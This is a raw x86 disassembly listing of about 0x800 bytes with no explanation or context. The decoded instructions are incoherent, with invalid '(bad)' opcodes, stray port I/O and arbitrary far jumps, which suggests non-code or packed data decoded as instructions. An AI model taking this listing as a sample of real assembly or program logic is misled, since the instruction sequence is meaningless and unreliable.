  425eaa:	sar    DWORD PTR [edx+0x12b6669e],0x75
  425eb1:	mov    ds:0x12595a48,al
  425eb6:	and    DWORD PTR [ecx-0x37],0x6e58dcff
  425ebd:	in     eax,dx
  425ebe:	out    0x8f,al
  425ec0:	in     eax,0x64
  425ec2:	rcr    BYTE PTR ds:0xb10b1a2a,1
  425ec8:	or     BYTE PTR [eax+ebp*1-0x417eaf01],ch
  425ecf:	jmp    0x425f4a
  425ed1:	inc    ebx
  425ed2:	sub    edi,esp
  425ed4:	pop    ds
  425ed5:	mov    al,0x62
  425ed7:	jle    0x425f55
  425ed9:	or     ecx,DWORD PTR [ecx]
  425edb:	imul   DWORD PTR [eax+eiz*4-0x24db0b8e]
  425ee2:	push   ebp
  425ee3:	xor    al,0xdc
  425ee5:	aaa    
  425ee6:	pop    eax
  425ee7:	inc    WORD PTR [esi-0x38dacbc7]
  425eee:	enter  0xdb27,0xad
  425ef2:	mov    cl,0x65
  425ef4:	add    al,0xbf
  425ef6:	ja     0x425f35
  425ef8:	fstp   TBYTE PTR ds:0xc946721f
  425efe:	int3   
  425eff:	xchg   BYTE PTR [eax],bl
  425f01:	les    ecx,FWORD PTR ds:0x2bc3ee23
  425f07:	xchg   dh,dh
  425f09:	xchg   ebp,edx
  425f0b:	imul   BYTE PTR [edx]
  425f0d:	ja     0x425f2b
  425f0f:	inc    esi
  425f10:	(bad)  
  425f11:	ins    DWORD PTR es:[edi],dx
  425f12:	clc    
  425f13:	neg    DWORD PTR [esi]
  425f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f16:	not    DWORD PTR [esi]
  425f18:	jecxz  0x425f7b
  425f1a:	dec    eax
  425f1b:	sub    edi,DWORD PTR [edi-0x21]
  425f1e:	and    DWORD PTR [esi],ebx
  425f20:	clc    
  425f21:	sbb    BYTE PTR [ecx+eax*4-0x56],0x21
  425f26:	popa   
  425f27:	ins    BYTE PTR es:[edi],dx
  425f28:	fdivr  QWORD PTR [edx]
  425f2a:	cmp    BYTE PTR [esi],ch
  425f2c:	test   BYTE PTR [edx-0x68a14066],al
  425f32:	and    BYTE PTR [ebp+eiz*4+0x2f],0x86
  425f37:	pop    esp
  425f38:	scas   al,BYTE PTR es:[edi]
  425f39:	add    bl,BYTE PTR [edx+0x5919b4ed]
  425f3f:	xchg   ebp,eax
  425f40:	add    DWORD PTR [esi-0x5d917b5],ecx
  425f46:	ffree  st(5)
  425f48:	nop
  425f49:	(bad)  [edi-0x5397c610]
  425f4f:	fcomp  DWORD PTR [edi+0x446b69c8]
  425f55:	mov    bl,0x1d
  425f57:	jg     0x425f8c
  425f59:	mov    al,ds:0x5e811a9
  425f5e:	ja     0x425f3a
  425f60:	mov    ebp,0x4ca8c908
  425f65:	sbb    ch,dh
  425f67:	imul   esp,DWORD PTR [ebx],0x44
  425f6a:	push   0x46
  425f6c:	inc    esp
  425f6d:	mov    fs,WORD PTR [ebx+0x5c9ea96f]
  425f73:	out    0x20,eax
  425f75:	adc    ebx,DWORD PTR [edi+0xfca4ea4]
  425f7b:	pop    edi
  425f7c:	push   0x3d
  425f7e:	cdq    
  425f7f:	lea    esp,[ebp+0x174a3eca]
  425f85:	push   esp
  425f86:	mov    dh,0xfe
  425f88:	mov    ecx,0x715f6876
  425f8d:	rol    eax,1
  425f8f:	pushf  
  425f90:	stos   BYTE PTR es:[edi],al
  425f91:	stc    
  425f92:	fdiv   DWORD PTR [eax+0x6b]
  425f95:	loopne 0x425faa
  425f97:	les    edi,FWORD PTR [ebx+0x76]
  425f9a:	or     ecx,DWORD PTR cs:[edi+0x7a]
  425f9e:	jecxz  0x426014
  425fa0:	mov    ebp,0x27d51b28
  425fa5:	rcl    bl,0xe2
  425fa8:	ins    DWORD PTR es:[edi],dx
  425fa9:	sub    cl,bl
  425fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fac:	mov    al,BYTE PTR [ebp-0x4cb72830]
  425fb2:	ret    0x23e
  425fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fb6:	in     al,0x6a
  425fb8:	xlat   BYTE PTR ds:[ebx]
  425fb9:	inc    edx
  425fba:	mov    esp,0x21ac6bbe
  425fbf:	shr    DWORD PTR [ebx-0x6a77fa74],0x28
  425fc6:	push   ebp
  425fc7:	sahf   
  425fc8:	mov    esi,0x770d4c3e
  425fcd:	sub    al,0xbc
  425fcf:	popa   
  425fd0:	(bad)  
  425fd1:	dec    edi
  425fd2:	cwde   
  425fd3:	std    
  425fd4:	sbb    al,0xfa
  425fd6:	pushf  
  425fd7:	cld    
  425fd8:	pop    eax
  425fd9:	or     dl,BYTE PTR [eax-0x309f8235]
  425fdf:	fidiv  DWORD PTR [esp+ebx*2-0xf]
  425fe3:	and    DWORD PTR [ebp+0x4519ad4],0x71
  425fea:	inc    esi
  425feb:	test   edx,ecx
  425fed:	retf   
  425fee:	shl    DWORD PTR [ebx-0x2bf4166c],1
  425ff4:	push   esp
  425ff5:	adc    dl,BYTE PTR [edi]
  425ff7:	sbb    bl,0x85
  425ffa:	add    BYTE PTR [edx],ah
  425ffc:	call   FWORD PTR [edx-0x1ddf305f]
  426002:	jmp    0xb85b:0x509df30f
  426009:	sahf   
  42600a:	add    bl,BYTE PTR [edi+0x15]
  42600d:	fdivr  QWORD PTR [edx]
  42600f:	push   ds
  426010:	mov    esp,0xe353595e
  426015:	in     al,0x7a
  426017:	adc    eax,0xd8f2b894
  42601c:	ds inc ebx
  42601e:	push   0xfb09c9c5
  426023:	cli    
  426024:	loop   0x426021
  426026:	pop    ecx
  426027:	sahf   
  426028:	les    esi,FWORD PTR [edx]
  42602a:	jmp    0x1a3a4e9d
  42602f:	push   0xffffff9e
  426031:	xchg   ecx,eax
  426032:	repnz rol BYTE PTR ss:[ebx+eax*4],cl
  426037:	lahf   
  426038:	in     al,dx
  426039:	mov    dl,0xad
  42603b:	mov    ebx,es
  42603d:	push   edi
  42603e:	std    
  42603f:	fcmove st,st(5)
  426041:	sub    BYTE PTR [ecx-0x26],0x44
  426045:	gs (bad) 
  426048:	scas   al,BYTE PTR es:[edi]
  426049:	rcl    DWORD PTR [ebx],cl
  42604b:	push   cs
  42604c:	shl    DWORD PTR [edi-0x6c2273ae],0xdc
  426053:	pop    es
  426054:	add    BYTE PTR [edx+0x6582ee3c],al
  42605a:	add    eax,esp
  42605c:	adc    edx,edi
  42605e:	out    0xdc,eax
  426060:	cmp    BYTE PTR [edx+esi*4-0x772c8411],dl
  426067:	jne    0x4260d3
  426069:	mov    WORD PTR [eax+0x60],gs
  42606c:	push   ecx
  42606d:	dec    edx
  42606e:	mov    ds,WORD PTR [ebp+0x310f2fad]
  426074:	push   0xffffffa9
  426076:	jecxz  0x425ffb
  426078:	aad    0x28
  42607a:	jecxz  0x4260d3
  42607c:	and    ah,al
  42607e:	inc    edx
  42607f:	outs   dx,BYTE PTR ds:[esi]
  426080:	inc    ebx
  426081:	mov    eax,ds:0x5a177a8
  426086:	addr16 jl 0x426083
  426089:	dec    esp
  42608a:	mov    dl,0x10
  42608c:	call   0x93a2:0x86b19b90
  426093:	adc    al,0x4
  426095:	inc    ecx
  426096:	push   ebp
  426097:	repnz xor dh,BYTE PTR [eax+ebx*8-0x47]
  42609c:	jp     0x426073
  42609e:	repz jnp 0x426022
  4260a1:	inc    esp
  4260a2:	enter  0x5ea7,0x10
  4260a6:	jns    0x426080
  4260a8:	adc    ebp,DWORD PTR [edx+0x63]
  4260ab:	dec    ebx
  4260ac:	add    ch,bh
  4260ae:	bound  edi,QWORD PTR [edi+edi*4+0x38e84111]
  4260b5:	ins    DWORD PTR es:[edi],dx
  4260b6:	retf   
  4260b7:	fidivr DWORD PTR [edi]
  4260b9:	push   eax
  4260ba:	inc    edx
  4260bb:	pop    ecx
  4260bc:	cmp    BYTE PTR [edx+0x51],0xb6
  4260c0:	or     al,BYTE PTR [ecx+0x4478f1f2]
  4260c6:	ret    
  4260c7:	cdq    
  4260c8:	sti    
  4260c9:	cld    
  4260ca:	aas    
  4260cb:	rcl    BYTE PTR [edi+edx*2+0x5e],0xa8
  4260d0:	xor    eax,0x8e522f8f
  4260d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260d6:	rcr    DWORD PTR [edx-0x2bebf3d7],cl
  4260dc:	xchg   esp,eax
  4260dd:	daa    
  4260de:	cmp    esi,DWORD PTR [eax+0x693d09ab]
  4260e4:	leave  
  4260e5:	sub    BYTE PTR [esi+0x4f],bh
  4260e8:	and    al,BYTE PTR fs:[ecx]
  4260eb:	test   eax,0xdeb6b2a
  4260f0:	jno    0x4260b9
  4260f2:	mov    dl,0x39
  4260f4:	stos   BYTE PTR es:[edi],al
  4260f5:	jge    0x4260b9
  4260f7:	enter  0x5c6f,0xf4
  4260fb:	imul   ebx,DWORD PTR [ebp-0x1d1cb9b2],0x48
  426102:	sbb    al,0xc9
  426104:	mov    bh,0xcb
  426106:	adc    DWORD PTR [eax-0x56708139],eax
  42610c:	bound  edx,QWORD PTR [ecx+0x62]
  42610f:	push   0xd252f9a6
  426114:	or     BYTE PTR ds:0x5726a9f4,bl
  42611a:	test   al,0xf9
  42611c:	mov    ds:0x75f315d6,al
  426121:	fsubp  st(0),st
  426123:	outs   dx,DWORD PTR ds:[esi]
  426124:	and    cl,ah
  426126:	cmp    BYTE PTR [esi-0x5057c66b],cl
  42612c:	cmp    al,0x9f
  42612e:	and    al,0x70
  426130:	adc    eax,0x3f8031b4
  426135:	and    eax,0xc8c4415e
  42613a:	mov    bh,0x40
  42613c:	ret    
  42613d:	lea    esp,[ebx-0x5c]
  426140:	sahf   
  426141:	in     eax,dx
  426142:	xchg   edx,eax
  426143:	in     eax,0xa7
  426145:	xchg   edx,eax
  426146:	dec    esi
  426147:	in     al,0xcd
  426149:	outs   dx,BYTE PTR ds:[esi]
  42614a:	sub    al,0x3c
  42614c:	jns    0x42613e
  42614e:	loop   0x42616f
  426150:	mov    ebp,0xdf8d3707
  426155:	mov    bh,0xfd
  426157:	in     al,dx
  426158:	outs   dx,DWORD PTR ds:[esi]
  426159:	mov    fs,WORD PTR [edi+edx*2]
  42615c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42615d:	cmc    
  42615e:	mov    cl,0xde
  426160:	test   eax,0xef3baf20
  426165:	out    dx,eax
  426166:	out    dx,eax
  426167:	neg    bh
  426169:	mov    bh,0x2c
  42616b:	cld    
  42616c:	(bad)  
  42616d:	cli    
  42616e:	sbb    ch,0x27
  426171:	jp     0x426104
  426173:	sbb    eax,0xd503aaf
  426178:	sub    eax,0xf7df6259
  42617d:	aaa    
  42617e:	jbe    0x42611f
  426180:	shl    DWORD PTR [eax+ebx*4-0x3f],0x35
  426185:	ins    DWORD PTR es:[edi],dx
  426186:	adc    DWORD PTR [eax+0x1247076b],0x5a691871
  426190:	xor    cl,bl
  426192:	mov    bh,0x9a
  426194:	dec    edx
  426195:	and    BYTE PTR [ebx+0x2720b7a3],al
  42619b:	sub    al,0x3b
  42619d:	rcr    DWORD PTR [ecx-0x77],1
  4261a0:	jg     0x426140
  4261a2:	sar    DWORD PTR [esi-0x37],1
  4261a5:	(bad)  
  4261a6:	sub    bl,BYTE PTR [edi]
  4261a8:	lods   al,BYTE PTR ds:[esi]
  4261a9:	into   
  4261aa:	pusha  
  4261ab:	js     0x426149
  4261ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261ae:	sbb    dl,BYTE PTR [ebp+ebp*8+0x3b]
  4261b2:	add    DWORD PTR [ebp-0x57],ecx
  4261b5:	xor    al,0xcd
  4261b7:	mov    cl,ah
  4261b9:	xchg   esp,eax
  4261ba:	push   0x79114626
  4261bf:	imul   BYTE PTR [edi+0x15b60f58]
  4261c5:	and    eax,0x51680239
  4261ca:	fdivp  st(0),st
  4261cc:	repz repz call 0xe230615e
  4261d3:	inc    ebp
  4261d4:	jmp    0x1e8b:0x8e65ed1e
  4261db:	paddq  mm0,QWORD PTR [ebx]
  4261de:	xor    esi,0xffffff9e
  4261e1:	xor    BYTE PTR [ecx],dl
  4261e3:	add    ebx,0x42ca2790
  4261e9:	and    dh,dl
  4261eb:	fidivr DWORD PTR [ecx+esi*2+0x6]
  4261ef:	pop    esi
  4261f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261f1:	jmp    0x22e8:0x70f1cd01
  4261f8:	mov    edx,0xebbc29bc
  4261fd:	fwait
  4261fe:	pop    esi
  4261ff:	mov    ss,WORD PTR ds:0xdba80a4b
  426205:	rol    BYTE PTR [edi],1
  426207:	push   esi
  426208:	dec    ebx
  426209:	push   ds
  42620a:	dec    ebp
  42620b:	and    edx,edx
  42620d:	repnz cmp BYTE PTR [ebx+eiz*1],dh
  426211:	lock sbb BYTE PTR [eax-0x30],dl
  426215:	jmp    0x4261ba
  426217:	xor    DWORD PTR [edx+0x12],0xffffffbf
  42621b:	rcr    ch,cl
  42621d:	add    ebx,0x5b
  426220:	sbb    eax,DWORD PTR [eax-0x35]
  426223:	pop    edx
  426224:	inc    ebx
  426225:	mov    eax,0x9c3c6514
  42622a:	sbb    DWORD PTR [ebx+0x22],0x7d
  42622e:	pop    ecx
  42622f:	(bad)  
  426230:	adc    eax,0x12b67905
  426235:	das    
  426236:	stc    
  426237:	ss xor ch,bl
  42623a:	adc    cl,BYTE PTR es:[esi]
  42623d:	pop    ebp
  42623e:	mov    cl,0xf8
  426240:	daa    
  426241:	sub    al,0x8f
  426243:	in     eax,dx
  426244:	sub    DWORD PTR [eax-0x4d],esi
  426247:	rcr    DWORD PTR [edx-0x57],1
  42624a:	mov    al,ds:0x9ce29744
  42624f:	adc    esp,DWORD PTR [ecx]
  426251:	in     al,dx
  426252:	hlt    
  426253:	jmp    0xd105:0xdccefdc6
  42625a:	inc    esp
  42625b:	or     edx,ecx
  42625d:	stc    
  42625e:	xchg   edi,eax
  42625f:	das    
  426260:	loope  0x4262c3
  426262:	and    DWORD PTR [ebp+ebx*8-0x65cb719b],edx
  426269:	rcr    ecx,0xe5
  42626c:	xchg   edx,eax
  42626d:	or     BYTE PTR [ebx+0x76f26d0d],dh
  426273:	cmp    al,BYTE PTR [esi]
  426275:	dec    esi
  426276:	cdq    
  426277:	add    al,0xed
  426279:	dec    ebp
  42627a:	gs das 
  42627c:	jne    0x426214
  42627e:	inc    ecx
  42627f:	and    bl,BYTE PTR [ebx-0x5b139d6c]
  426285:	dec    esi
  426286:	xchg   ebx,eax
  426287:	das    
  426288:	test   BYTE PTR ds:0xe31cf7f5,ch
  42628e:	test   DWORD PTR [ebx+0xac80175],esp
  426294:	ds mov ebx,0x6ac4f5e6
  42629a:	mov    esi,0x258f435b
  42629f:	je     0x426241
  4262a1:	push   ds
  4262a2:	jle    0x42630b
  4262a4:	cs (bad) 
  4262a6:	pop    esp
  4262a7:	setg   BYTE PTR [edi+eiz*8-0x51]
  4262ac:	sub    cl,BYTE PTR [ecx]
  4262ae:	and    al,0xfd
  4262b0:	scas   al,BYTE PTR es:[edi]
  4262b1:	arpl   WORD PTR [ecx+0x1a],cx
  4262b4:	pop    eax
  4262b5:	enter  0xd301,0x70
  4262b9:	pop    ebx
  4262ba:	icebp  
  4262bb:	scas   eax,DWORD PTR es:[edi]
  4262bc:	mov    ds:0xbd5b0c5d,al
  4262c1:	in     eax,dx
  4262c2:	xlat   BYTE PTR ds:[ebx]
  4262c3:	jp     0x4262b2
  4262c5:	dec    esi
  4262c6:	iret   
  4262c7:	add    ch,al
  4262c9:	imul   ebp,DWORD PTR [ecx-0x2a],0x68037ed4
  4262d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262d1:	push   ss
  4262d2:	xor    esi,eax
  4262d4:	push   0xd5ef79ad
  4262d9:	aam    0xb3
  4262db:	dec    ecx
  4262dc:	ret    0x9bf1
  4262df:	mov    dl,0x49
  4262e1:	je     0x42632a
  4262e3:	cli    
  4262e4:	test   al,0xee
  4262e6:	mov    esp,0x1c28711
  4262eb:	hlt    
  4262ec:	shl    BYTE PTR [eax-0x9],0x23
  4262f0:	jmp    0x4262f4
  4262f2:	xchg   edx,eax
  4262f3:	pop    edi
  4262f4:	sbb    edi,edi
  4262f6:	inc    edi
  4262f7:	mov    eax,0xfb9dfd86
  4262fc:	adc    eax,0x19e6d082
  426301:	jmp    0x4262c0
  426303:	ds in  eax,0x1d
  426306:	loopne 0x42629b
  426308:	retf   
  426309:	fmul   DWORD PTR [esi-0x2c7ee4d6]
  42630f:	fld    DWORD PTR [edx+ebx*1-0x22c1e37]
  426316:	popf   
  426317:	xchg   esp,eax
  426318:	fcomp  DWORD PTR [edx-0x7e]
  42631b:	pop    ebx
  42631c:	pusha  
  42631d:	in     eax,0x69
  42631f:	stos   DWORD PTR es:[edi],eax
  426320:	cmp    eax,0xf2b6ee57
  426325:	pusha  
  426326:	(bad)  
  426327:	push   edx
  426328:	pop    esi
  426329:	in     al,0xcd
  42632b:	daa    
  42632c:	jns    0x426331
  42632e:	mov    ch,0x38
  426330:	(bad)  
  426331:	xchg   ebx,eax
  426332:	daa    
  426333:	(bad)  
  426335:	imul   esi,DWORD PTR [ecx],0x43
  426338:	icebp  
  426339:	xchg   ecx,eax
  42633a:	dec    eax
  42633b:	push   ss
  42633c:	and    BYTE PTR [ebx+edi*2],0x44
  426340:	pop    es
  426341:	es mov edi,0x327adf75
  426347:	daa    
  426348:	out    0xbd,al
  42634a:	es (bad) 
  42634c:	dec    BYTE PTR [ebp+0x3f8c496c]
  426352:	push   ebp
  426353:	pop    ecx
  426354:	push   esi
  426355:	push   ecx
  426356:	mov    ?,edi
  426358:	ja     0x4262e2
  42635a:	mov    cl,0xca
  42635c:	xor    dh,BYTE PTR [edi-0x44]
  42635f:	jecxz  0x4262e8
  426361:	ror    dl,cl
  426363:	pop    ss
  426364:	cli    
  426365:	sub    ah,al
  426367:	in     eax,dx
  426368:	xlat   BYTE PTR ds:[ebx]
  426369:	daa    
  42636a:	pop    esi
  42636b:	les    edx,FWORD PTR [ebp-0x31]
  42636e:	rcl    BYTE PTR [ebx],0xf1
  426371:	stc    
  426372:	xchg   edi,eax
  426373:	pop    edx
  426374:	pop    edi
  426375:	mov    ebp,0x3b38e632
  42637a:	gs mov cl,0x60
  42637d:	stos   BYTE PTR es:[edi],al
  42637e:	pxor   mm5,QWORD PTR [eax+eax*2+0x6d0bbecc]
  426386:	ret    
  426387:	pop    ecx
  426388:	adc    DWORD PTR [ecx-0x6c],edx
  42638b:	or     cl,ah
  42638d:	pop    ds
  42638e:	xchg   esp,eax
  42638f:	aas    
  426390:	xchg   ecx,eax
  426391:	or     al,0x42
  426393:	sti    
  426394:	mov    ecx,esi
  426396:	jno    0x42635c
  426398:	push   0xd6b69a70
  42639d:	fsubr  DWORD PTR [esi+0x2cdd03e6]
  4263a3:	xchg   ebx,eax
  4263a4:	inc    eax
  4263a5:	ret    0xb36a
  4263a8:	pop    ss
  4263a9:	or     eax,0x8473b73
  4263ae:	out    0x3c,eax
  4263b0:	loopne 0x4263c5
  4263b2:	cmp    al,0x31
  4263b4:	jp     0x4263e0
  4263b6:	mov    cs,WORD PTR [eax-0xc]
  4263b9:	pop    ebx
  4263ba:	jge    0x426348
  4263bc:	sub    bh,cl
  4263be:	(bad)  
  4263c0:	jae    0x42643c
  4263c2:	xchg   esp,eax
  4263c3:	pop    eax
  4263c4:	ins    BYTE PTR es:[edi],dx
  4263c5:	mov    ds:0xf7d165d6,eax
  4263ca:	call   0x195eb56b
  4263cf:	sub    al,0x4e
  4263d1:	iret   
  4263d2:	add    al,0x52
  4263d4:	adc    DWORD PTR [edx],esi
  4263d6:	jmp    0x4263fe
  4263d8:	jno    0x4263f3
  4263da:	(bad)  
  4263db:	shl    edx,1
  4263dd:	xchg   BYTE PTR [edi+ecx*2],al
  4263e0:	ins    BYTE PTR es:[edi],dx
  4263e1:	mov    DWORD PTR [ebp-0x25],ecx
  4263e4:	imul   DWORD PTR [eax]
  4263e6:	out    0xcf,eax
  4263e8:	fwait
  4263e9:	ds repnz daa 
  4263ec:	sbb    BYTE PTR [esi],bl
  4263ee:	mov    ebx,DWORD PTR [edi]
  4263f0:	mov    al,0x8e
  4263f2:	pop    esi
  4263f3:	clc    
  4263f4:	ins    DWORD PTR es:[edi],dx
  4263f5:	add    BYTE PTR [ecx+0x3c],bl
  4263f8:	cmp    bh,BYTE PTR [edx]
  4263fa:	or     al,0x92
  4263fc:	lahf   
  4263fd:	imul   ecx,edi,0x5b
  426400:	into   
  426401:	add    al,0xcc
  426403:	fucomip st,st(0)
  426405:	cmp    eax,0x70334d54
  42640a:	mov    es,WORD PTR [edx+0x24]
  42640d:	lods   eax,DWORD PTR ds:[esi]
  42640e:	test   DWORD PTR [ebx+0x2b03d160],edi
  426414:	pop    ebx
  426415:	dec    esi
  426416:	jae    0x426494
  426418:	loope  0x426409
  42641a:	shl    DWORD PTR [edx-0x3c7146fb],1
  426420:	xchg   esp,eax
  426421:	cwde   
  426422:	xchg   ebx,eax
  426423:	iret   
  426424:	fnsave [ebp+0x53eaba7a]
  42642a:	and    DWORD PTR [esi-0x7edcee7e],eax
  426430:	add    eax,0x2ae6b894
  426435:	cli    
  426436:	pop    esi
  426437:	cmp    esi,DWORD PTR [eax+0x1b8d7fce]
  42643d:	mov    bl,0x56
  42643f:	push   ecx
  426440:	das    
  426441:	fldenv [edx+0x30b4b8a8]
  426447:	add    esp,ebp
  426449:	push   edi
  42644a:	loopne 0x426424
  42644c:	adc    eax,esi
  42644e:	out    0x19,al
  426450:	mov    esi,0x3bb812fa
  426455:	add    bh,BYTE PTR [ebp-0x40]
  426458:	pop    ds
  426459:	pop    edi
  42645a:	jle    0x426450
  42645c:	ss dec edx
  42645e:	inc    ebx
  42645f:	rol    DWORD PTR [ebx+eax*8+0x35],0xab
  426464:	test   DWORD PTR [ebx+0x10],esi
  426467:	add    ebx,edi
  426469:	push   edi
  42646a:	dec    eax
  42646b:	cmp    esp,edx
  42646d:	ror    BYTE PTR [eax],cl
  42646f:	cli    
  426470:	adc    BYTE PTR [ebx-0xe],ah
  426473:	push   edx
  426474:	sbb    DWORD PTR [edi+0x616eb392],ebp
  42647a:	push   es
  42647b:	outs   dx,DWORD PTR ds:[esi]
  42647c:	mov    WORD PTR [edi],?
  42647e:	das    
  42647f:	(bad)  
  426480:	les    eax,FWORD PTR [eax+0x797b2bc0]
  426486:	sbb    DWORD PTR [edx-0x51],ebp
  426489:	imul   edi,DWORD PTR [ebx],0x17
  42648c:	mov    ecx,0x4824aa21
  426491:	(bad)  [edx]
  426493:	sub    BYTE PTR [eax+0x6b],0xbe
  426497:	jge    0x42643e
  426499:	sub    BYTE PTR [esi-0x57e6b94],0x7b
  4264a0:	hlt    
  4264a1:	pop    ebp
  4264a2:	rol    BYTE PTR [eax+0x2a],cl
  4264a5:	push   ecx
  4264a6:	test   DWORD PTR [edx],ebp
  4264a8:	inc    ecx
  4264a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264aa:	cli    
  4264ab:	popf   
  4264ac:	int    0xd0
  4264ae:	in     al,dx
  4264af:	aaa    
  4264b0:	pop    edx
  4264b1:	loope  0x42648a
  4264b3:	enter  0x1a77,0x50
  4264b7:	retf   
  4264b8:	xor    BYTE PTR [edi*8-0x29e14668],cl
  4264bf:	cli    
  4264c0:	mov    WORD PTR [esi-0x1f],ss
  4264c3:	les    esp,FWORD PTR [ecx-0x5c06fa39]
  4264c9:	in     eax,0x40
  4264cb:	add    BYTE PTR [eax-0x44],bh
  4264ce:	(bad)  
  4264cf:	call   0x7453182d
  4264d4:	sbb    eax,0xe580ea47
  4264d9:	fcomip st,st(2)
  4264db:	es jle 0x4264d1
  4264de:	pop    es
  4264df:	(bad)  
  4264e0:	or     DWORD PTR [edi+0xa5],esi
  4264e6:	add    BYTE PTR [eax],al
  4264e8:	add    BYTE PTR [eax],al
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	push   ebx
  4264f7:	inc    ebp
  4264f8:	xchg   esp,eax
  4264f9:	repz (bad) 
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	add    DWORD PTR [esi],0x3d2d0000
  426504:	or     BYTE PTR [ebx+0x31],ch
  426507:	push   eax
  426508:	add    DWORD PTR [ecx],0x5e5731f1
  42650e:	mov    dh,0xf8
  426510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426511:	xor    ebp,DWORD PTR [edi]
  426513:	stos   BYTE PTR es:[edi],al
  426514:	sbb    BYTE PTR [ecx],0x32
  426517:	lea    edi,[esi]
  426519:	pop    ss
  42651a:	pop    ecx
  42651b:	call   0x2a34:0xfc016082
  426522:	adc    ebx,DWORD PTR [edi+0x51836b1]
  426528:	test   al,0xef
  42652a:	imul   eax,DWORD PTR [esi-0x17],0xfffffff9
  42652e:	fsubr  DWORD PTR [edx-0x69]
  426531:	out    dx,al
  426532:	or     dh,dl
  426534:	pop    ss
  426535:	icebp  
  426536:	addr16 repnz mov ah,0x54
  42653a:	xor    al,0xbd
  42653c:	jno    0x4265b5
  42653e:	xchg   edi,eax
  42653f:	gs adc eax,0x148589e9
  426545:	sbb    BYTE PTR [edi],bl
  426547:	loope  0x426528
  426549:	daa    
  42654a:	mov    ebx,0x43b61c3c
  42654f:	data16 cld 
  426551:	dec    ebp
  426552:	adc    al,0xfb
  426554:	cmp    BYTE PTR [edx],bh
  426556:	call   0x7d75c67e
  42655b:	jge    0x42659a
  42655d:	aam    0x31
  42655f:	adc    ebp,DWORD PTR [ecx+ebx*2+0x6cc8fb6a]
  426566:	loopne 0x426514
  426568:	lock fwait
  42656a:	jmp    0xeb2d:0xdb6b5ad9
  426571:	adc    dl,bl
  426573:	and    eax,0xe408375a
  426578:	shr    dh,0xb7
  42657b:	inc    edi
  42657c:	fwait
  42657d:	sbb    DWORD PTR [ebp+0x2d4de9cf],ecx
  426583:	sub    DWORD PTR [edi],edx
  426585:	push   ebp
  426586:	dec    eax
  426587:	loope  0x42650d
  426589:	pop    eax
  42658a:	fdivr  DWORD PTR [edx+0x55e104f0]
  426590:	xchg   ebx,eax
  426591:	and    al,0x5f
  426593:	leave  
  426594:	hlt    
  426595:	sub    eax,0xa8286be9
  42659a:	cdq    
  42659b:	js     0x426537
  42659d:	xor    ecx,0xffffffff
  4265a0:	push   ds
  4265a1:	push   edi
  4265a2:	xor    ebp,DWORD PTR ds:0xd2085a3f
  4265a8:	mov    esp,0xf4ec0624
  4265ad:	mov    ebx,0x59292f0
  4265b2:	mov    al,0x26
  4265b4:	push   eax
  4265b5:	and    dh,BYTE PTR [edi+0x5]
  4265b8:	add    eax,0x8e898e1d
  4265bd:	mov    ds:0x5e6882b7,eax
  4265c2:	sub    DWORD PTR [ecx-0x71],edx
  4265c5:	sbb    BYTE PTR [edx],al
  4265c7:	fistp  WORD PTR [ecx+0x240f1520]
  4265cd:	fwait
  4265ce:	lods   al,BYTE PTR ds:[esi]
  4265cf:	cmc    
  4265d0:	push   ecx
  4265d1:	test   BYTE PTR [ebp+0x63],ch
  4265d4:	pop    edi
  4265d5:	shl    DWORD PTR [edi],1
  4265d7:	jle    0x42660c
  4265d9:	or     BYTE PTR [edx-0x3b],dl
  4265dc:	sbb    al,0xc9
  4265de:	mov    esi,0xc68f278a
  4265e3:	mov    dl,0xcf
  4265e5:	scas   eax,DWORD PTR es:[edi]
  4265e6:	sti    
  4265e7:	push   cs
  4265e8:	(bad)  
  4265ea:	adc    esi,esp
  4265ec:	fidivr DWORD PTR [eax-0x74075b25]
  4265f2:	loopne 0x426608
  4265f4:	sbb    al,0xd6
  4265f6:	jg     0x4265f8
  4265f8:	out    dx,al
  4265f9:	lock shl bh,1
  4265fc:	jne    0x4265cf
  4265fe:	imul   ebx,DWORD PTR [ebp+eiz*2+0x764564a7],0xffffff98
  426606:	popf   
  426607:	pop    edx
  426608:	or     dl,bh
  42660a:	ret    0x407a
  42660d:	push   ebx
  42660e:	xor    BYTE PTR [ebx+edx*8+0x5d1e042d],dl
  426615:	push   ebx
  426616:	lahf   
  426617:	mov    edi,0x6269efd5
  42661c:	cmp    ch,BYTE PTR [ebx]
  42661e:	gs cdq 
  426620:	retf   
  426621:	push   ds
  426622:	das    
  426623:	addr16 adc eax,0x7c9b938
  426629:	pop    ss
  42662a:	mov    ebx,0xc6c98438
  42662f:	enter  0x990e,0x2b
  426633:	pop    edx
  426634:	mov    bl,0xb6
  426636:	push   ecx
  426637:	push   esi
  426638:	fldcw  WORD PTR [edi+0x4be7d8f1]
  42663e:	lds    edi,FWORD PTR [ebx+0x456dbcc2]
  426644:	mov    dh,0xc7
  426646:	mov    eax,0x5dd0a092
  42664b:	jg     0x42664e
  42664d:	xor    eax,0xb2c9aad6
  426652:	xchg   ebp,eax
  426653:	mov    ecx,0xb5269cd7
  426658:	sbb    eax,0xa4633fa6
  42665d:	add    eax,0x6932282c
  426662:	test   DWORD PTR [esi+0x50966a3b],esi
  426668:	(bad)  
  426669:	xchg   esp,eax
  42666a:	imul   esi,esi,0xff8d5000
  426670:	mov    cl,BYTE PTR [ebx-0x5ae172ec]
  426676:	mov    BYTE PTR [edx],0x69
  426679:	and    dh,ch
  42667b:	pop    esp
  42667c:	int    0x87
  42667e:	fwait
  42667f:	vfmaddsubps xmm0,xmm0,xmm7,XMMWORD PTR [ebp+0x1e]
  426686:	inc    edx
  426687:	add    DWORD PTR [eax+0x485ac15a],esi
  42668d:	dec    ebx
